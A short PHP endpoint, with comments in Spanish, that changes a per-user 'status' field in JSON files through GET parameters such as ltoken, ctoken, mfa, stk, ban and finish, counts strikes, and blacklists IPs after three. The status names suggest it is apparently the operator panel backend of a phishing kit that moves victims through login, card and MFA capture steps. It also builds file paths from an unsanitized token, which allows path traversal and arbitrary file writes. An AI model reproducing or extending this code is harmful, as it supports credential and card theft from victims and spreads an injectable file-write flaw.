<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Content-Type: application/json");

$directory = '../users/';
$blacklistFile = '../blacklist.txt';

function updateStatus($token, $statusKey, $statusValue) {
    global $directory, $blacklistFile;
    $filename = $directory . $token . '.json';

    if (file_exists($filename)) {
        $json = file_get_contents($filename);
        $data = json_decode($json, true);
        $data[$statusKey] = $statusValue;
        if (isset($data['strikes'])) {
            $data['strikes'] = intval($data['strikes']) + 1;
            if ($data['strikes'] == 3) {
                // Obtener la IP del usuario actual
                $ip = $_SERVER['REMOTE_ADDR'];

                // Agregar la IP al archivo de blacklist
                file_put_contents($blacklistFile, $ip . PHP_EOL, FILE_APPEND);
            }
        } else {
            $data['strikes'] = 1;
        }
        $updatedJson = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents($filename, $updatedJson);
        echo json_encode(array(
            'status' => '200 OK',
            'strikes' => $data['strikes']
        ));
    } else {
        echo json_encode(array(
            'status' => '404 Not Found'
        ));
    }
}

if (isset($_GET['ltoken'])) {
    $token = $_GET['ltoken'];
    updateStatus($token, 'status', 'ltoken');
} elseif (isset($_GET['ctoken'])) {
    $token = $_GET['ctoken'];
    updateStatus($token, 'status', 'ctoken');
} elseif (isset($_GET['mtoken'])) {
    $token = $_GET['mtoken'];
    updateStatus($token, 'status', 'mtoken');
} elseif (isset($_GET['ban'])) {
    $token = $_GET['ban'];
    updateStatus($token, 'status', 'banned');
} elseif (isset($_GET['leave'])) {
    $token = $_GET['leave'];
    updateStatus($token, 'status', 'leave');
} elseif (isset($_GET['finish'])) {
    $token = $_GET['finish'];
    updateStatus($token, 'status', 'finished');
} elseif (isset($_GET['mfa'])) {
    $token = $_GET['mfa'];
    updateStatus($token, 'status', 'mfa');
} elseif (isset($_GET['stk'])) {
    $token = $_GET['stk'];
    updateStatus($token, 'status', 'stk');
} else {
    echo json_encode(array(
        'status' => '400 Bad Request'
    ));
}
?>

